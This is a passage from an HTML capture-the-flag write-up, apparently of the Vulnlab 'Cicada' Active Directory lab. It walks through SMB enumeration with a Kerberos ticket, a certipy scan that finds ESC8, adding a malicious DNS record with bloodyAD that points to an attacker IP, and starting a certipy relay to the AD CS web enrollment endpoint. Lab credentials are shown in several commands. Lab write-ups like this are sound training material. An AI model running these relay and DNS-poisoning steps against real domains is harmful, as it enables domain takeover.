+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> TGT saved to: Rosie.Powell.ccache
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> Run the following command to use the TGT: export KRB5CCNAME=Rosie.Powell.cc
+ache  
+</span></code></pre></div></div>
+<p>I’ll use it to connect to SMB:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Rosie.Powell.ccache smbclient.py <span class="nt">-k</span> DC-JPQ225.cicada.vl
+<span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+</span><span class="gp">#</span><span class="w"> </span>shares
+<span class="go">ADMIN$
+C$
+CertEnroll
+IPC$
+NETLOGON
+profiles$
+SYSVOL
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">profiles$</code> is the same as the NFS share. <code class="language-plaintext highlighter-rouge">CertEnroll</code> has a bunch of certificates:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span>use CertEnroll
+<span class="gp">#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">drw-rw-rw-          0  Mon Jun 16 20:41:25 2025 .
+drw-rw-rw-          0  Fri Sep 13 15:17:59 2024 ..
+-rw-rw-rw-        741  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(1)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(1).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(10)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(10).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(11)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(11).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(12)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(12).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(13)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(13).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(14)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(14).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(15)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(15).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(16)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(16).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(17)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(17).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(18)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(18).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(19)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(19).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(2)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(2).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(20)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(20).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(21)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(21).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(22)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(22).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(23)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(23).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(24)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(24).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(25)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(25).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(26)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(26).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(27)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(27).crl
+-rw-rw-rw-        742  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(28)+.crl
+-rw-rw-rw-        943  Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(28).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(3)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(3).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(4)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(4).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(5)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(5).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(6)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(6).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(7)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(7).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(8)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(8).crl
+-rw-rw-rw-        741  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(9)+.crl
+-rw-rw-rw-        941  Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(9).crl
+-rw-rw-rw-        736  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA+.crl
+-rw-rw-rw-        933  Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA.crl
+-rw-rw-rw-       1385  Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(0-1).crt
+-rw-rw-rw-        924  Sun Sep 15 07:51:18 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1).crt
+-rw-rw-rw-       1390  Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-0).crt
+-rw-rw-rw-       1390  Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-2).crt
+-rw-rw-rw-        924  Thu Apr 10 08:44:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10).crt
+-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-11).crt
+-rw-rw-rw-       1391  Thu Apr 10 08:57:00 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-9).crt
+-rw-rw-rw-        924  Thu Apr 10 08:58:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11).crt
+-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-10).crt
+-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-12).crt
+-rw-rw-rw-        924  Thu Apr 10 09:00:22 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12).crt
+-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-11).crt
+-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-13).crt
+-rw-rw-rw-        924  Thu Apr 10 09:03:13 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13).crt
+-rw-rw-rw-       1391  Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-12).crt
+-rw-rw-rw-       1391  Tue Jun  3 10:21:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-14).crt
+-rw-rw-rw-        924  Fri Apr 11 05:49:41 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14).crt
+-rw-rw-rw-       1391  Tue Jun  3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-13).crt
+-rw-rw-rw-       1391  Tue Jun  3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-15).crt
+-rw-rw-rw-        924  Fri Apr 11 05:51:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15).crt
+-rw-rw-rw-       1391  Tue Jun  3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-14).crt
+-rw-rw-rw-       1391  Tue Jun  3 10:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-16).crt
+-rw-rw-rw-        924  Fri Apr 11 05:53:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16).crt
+-rw-rw-rw-       1391  Tue Jun  3 10:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-15).crt
+-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-17).crt
+-rw-rw-rw-        924  Tue Jun  3 10:23:15 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17).crt
+-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-16).crt
+-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-18).crt
+-rw-rw-rw-        924  Tue Jun  3 10:24:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18).crt
+-rw-rw-rw-       1391  Wed Jun  4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-17).crt
+-rw-rw-rw-       1391  Wed Jun  4 12:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-19).crt
+-rw-rw-rw-        924  Tue Jun  3 10:26:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19).crt
+-rw-rw-rw-       1391  Wed Jun  4 12:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-18).crt
+-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-20).crt
+-rw-rw-rw-        924  Sun Sep 15 07:53:03 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2).crt
+-rw-rw-rw-       1390  Sun Sep 15 13:18:44 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-1).crt
+-rw-rw-rw-       1390  Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-3).crt
+-rw-rw-rw-        924  Wed Jun  4 12:52:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20).crt
+-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-19).crt
+-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-21).crt
+-rw-rw-rw-        924  Wed Jun  4 12:54:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21).crt
+-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-20).crt
+-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-22).crt
+-rw-rw-rw-        924  Wed Jun  4 12:56:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22).crt
+-rw-rw-rw-       1391  Wed Jun  4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-21).crt
+-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-23).crt
+-rw-rw-rw-        924  Wed Jun  4 13:36:17 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23).crt
+-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-22).crt
+-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-24).crt
+-rw-rw-rw-        924  Wed Jun  4 13:38:20 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24).crt
+-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-23).crt
+-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-25).crt
+-rw-rw-rw-        924  Wed Jun  4 13:40:21 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25).crt
+-rw-rw-rw-       1391  Wed Jun  4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-24).crt
+-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-26).crt
+-rw-rw-rw-        924  Wed Jun  4 14:04:01 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26).crt
+-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-25).crt
+-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-27).crt
+-rw-rw-rw-        924  Wed Jun  4 14:05:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27).crt
+-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-26).crt
+-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-28).crt
+-rw-rw-rw-        924  Wed Jun  4 14:07:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28).crt
+-rw-rw-rw-       1391  Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28-27).crt
+-rw-rw-rw-        924  Mon Jun 16 20:37:22 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(29).crt
+-rw-rw-rw-        924  Sun Sep 15 13:21:57 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3).crt
+-rw-rw-rw-       1390  Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-2).crt
+-rw-rw-rw-       1390  Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-4).crt
+-rw-rw-rw-        924  Mon Jun 16 20:39:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(30).crt
+-rw-rw-rw-        924  Mon Jun 16 20:41:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(31).crt
+-rw-rw-rw-        924  Sun Sep 15 13:24:12 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4).crt
+-rw-rw-rw-       1390  Sun Sep 29 09:41:30 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-3).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-5).crt
+-rw-rw-rw-        924  Sun Sep 29 09:43:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-4).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-6).crt
+-rw-rw-rw-        924  Sun Sep 29 09:44:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-5).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-7).crt
+-rw-rw-rw-        924  Sun Sep 29 09:46:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-6).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-8).crt
+-rw-rw-rw-        924  Thu Apr 10 08:40:45 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-7).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-9).crt
+-rw-rw-rw-        924  Thu Apr 10 08:42:44 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-10).crt
+-rw-rw-rw-       1390  Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-8).crt
+-rw-rw-rw-        885  Fri Sep 13 10:50:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA.crt
+-rw-rw-rw-        331  Fri Sep 13 15:17:59 2024 nsrev_cicada-DC-JPQ225-CA.asp
+</span></code></pre></div></div>
+<p>These are public keys, and not sensitive.</p>
+<h3 id="adcs-enumeration">ADCS Enumeration</h3>
+<p>Given the ADCS activity, I’ll scan for ADCS vulnerabilities using <code class="language-plaintext highlighter-rouge">certipy</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy find <span class="nt">-target</span> DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell@cicada.vl <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-vulnerable</span> <span class="nt">-stdout</span>
+<span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 13 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
+[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : cicada-DC-JPQ225-CA
+    DNS Name                            : DC-JPQ225.cicada.vl
+    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
+    Certificate Serial Number           : 6B8F71DF18F81D804D7BF4E3504C6C4D
+    Certificate Validity Start          : 2025-06-16 20:31:15+00:00
+    Certificate Validity End            : 2525-06-16 20:41:15+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : True
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : CICADA.VL\Administrators
+      Access Rights
+        ManageCa                        : CICADA.VL\Administrators
+                                          CICADA.VL\Domain Admins
+                                          CICADA.VL\Enterprise Admins
+        ManageCertificates              : CICADA.VL\Administrators
+                                          CICADA.VL\Domain Admins
+                                          CICADA.VL\Enterprise Admins
+        Enroll                          : CICADA.VL\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled over HTTP.
+Certificate Templates                   : [!] Could not find any certificate templates
+</span></code></pre></div></div>
+<p>It does not find any vulnerable templates, but it finds that the CA itself is vulnerable to ESC8.</p>
+<h3 id="esc8-exploitation">ESC8 Exploitation</h3>
+<h4 id="background">Background</h4>
+<p>The <a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment">Certipy Wiki</a> describes ESC8 as:</p>
+<blockquote>
+<p>ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint. These web-based interfaces provide alternative methods for users and computers to request certificates.</p>
+</blockquote>
+<p>The wiki goes on to describe the attack in six steps:</p>
+<blockquote>
+<ol>
+<li><strong>Coerce Authentication:</strong> The attacker coerces a privileged account to authenticate to a machine controlled by the attacker using NTLM. Common targets for coercion include Domain Controller machine accounts (e.g., using tools like PetitPotam or Coercer, or other RPC-based coercion techniques against MS-EFSRPC, MS-RPRN, etc.) or Domain Admin user accounts (e.g., via phishing or other social engineering that triggers an NTLM authentication).</li>
+<li><strong>Set up NTLM Relay:</strong> The attacker uses an NTLM relay tool, such as Certipy’s <code class="language-plaintext highlighter-rouge">relay</code> command, listening for incoming NTLM authentications.</li>
+<li><strong>Relay Authentication:</strong> When the victim account authenticates to the attacker’s machine, Certipy captures this incoming NTLM authentication attempt and forwards (relays) it to the vulnerable AD CS HTTP web enrollment endpoint (e.g., <code class="language-plaintext highlighter-rouge">https://&lt;ca_server&gt;/certsrv/certfnsh.asp</code>).</li>
+<li><strong>Impersonate and Request Certificate:</strong> The AD CS web service, receiving what it believes to be a legitimate NTLM authentication from the relayed privileged account, processes subsequent enrollment requests from Certipy as that privileged account. Certipy then requests a certificate, typically specifying a template for which the relayed privileged account has enrollment rights (e.g., the “DomainController” template if a DC machine account is relayed, or the default “User” template for a user account).</li>
+<li><strong>Obtain Certificate:</strong> The CA issues the certificate. Certipy, acting as the intermediary, receives this certificate.</li>
+<li><strong>Use Certificate for Privileged Access:</strong> The attacker can now use this certificate (e.g., in a <code class="language-plaintext highlighter-rouge">.pfx</code> file) with <code class="language-plaintext highlighter-rouge">certipy auth</code> to authenticate as the impersonated privileged account via Kerberos PKINIT, potentially leading to full domain compromise.</li>
+</ol>
+</blockquote>
+<p>Basically if I can get the machine to authenticate back to me, I’ll relay that auth to ADCS and get a certificate as the machine account. <a href="https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html">This post</a> from Tyranid’s Lair shows how it’s possible to relay Kerberos authentication.</p>
+<h4 id="strategies">Strategies</h4>
+<p>There are at least two ways to approach this exploitation.</p>
+<p>The first is to create a Windows VM and join it to the domain. The MachineAccountQuota is set to 10 (the default), so this should be do able:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-M</span> maq
+<span class="netexec-protocol">LDAP </span><span class="go">       DC-JPQ225.cicada.vl 389    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go"> None (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logfail">signing:None</span><span class="go">) (</span><span class="netexec-shareenum">channel binding:Never</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">LDAP </span><span class="go">       DC-JPQ225.cicada.vl 389    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 
+</span><span class="nb">MAQ </span><span class="go">        DC-JPQ225.cicada.vl 389    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go"> Getting the MachineAccountQuota
+</span><span class="nb">MAQ </span><span class="go">        DC-JPQ225.cicada.vl 389    DC-JPQ225        MachineAccountQuota: 10
+</span></code></pre></div></div>
+<p>With a Windows host on the domain, I can run <a href="https://github.com/CICADA8-Research/RemoteKrbRelay">RemoteKrbRelay</a>, which will handle the entire exploit, coercing authentication and relaying it to the HTTP certificate server.</p>
+<p>The other approach is from my Linux VM, where I’ll use the strategy described in <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html">this Synactiv post</a> to add a DNS record that includes a serialized SPN that will trick the server into requesting a Kerberos ticket for the machine account but connects to the malicious record which points to the attacker. The attacker can relay that back to the DC to request a ticket.</p>
+<pre><code class="language-mermaid">flowchart TD;
+    A[Auth as\nRosie.Powell]--&gt;B(Join Windows VM\nto domain);
+    B--&gt;C(RemoteKrbRelay.exe);
+    C--&gt;D[Certificate as\nDC-JPQ225$];
+    A--&gt;E(Add malicious\nDNS record);
+    E--&gt;F(Coerce with\nPetitPotam);
+    F--&gt;D;
+</code></pre>
+<p>I’ll only show the Linux attack path here. The machine author, xct, covers the first approach in <a href="https://vuln.dev/vulnlab-cicada/">his writeup</a>.</p>
+<h4 id="attack">Attack</h4>
+<p>The record to add is structured as <code class="language-plaintext highlighter-rouge">&lt;host&gt;&lt;empty CREDENTIAL_TARGET_INFOMATION structure&gt;</code>, which in this case will be <code class="language-plaintext highlighter-rouge">DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code>. I’ll set the DNS record with <code class="language-plaintext highlighter-rouge">bloodyAD</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodyAD <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-d</span> cicada.vl <span class="nt">-k</span> <span class="nt">--host</span> DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.79
+<span class="go">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
+</span></code></pre></div></div>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">certipy relay</code> targeting the ADCS webserver, and it listens on SMB:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy relay <span class="nt">-target</span> <span class="s1">'http://dc-jpq225.cicada.vl/'</span> <span class="nt">-template</span> DomainController
+<span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+[*] Setting up SMB Server on port 445
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">netexec</code> module <code class="language-plaintext highlighter-rouge">coerce_plus</code> will check several different methods for coercing authentication from the machine account:</p>
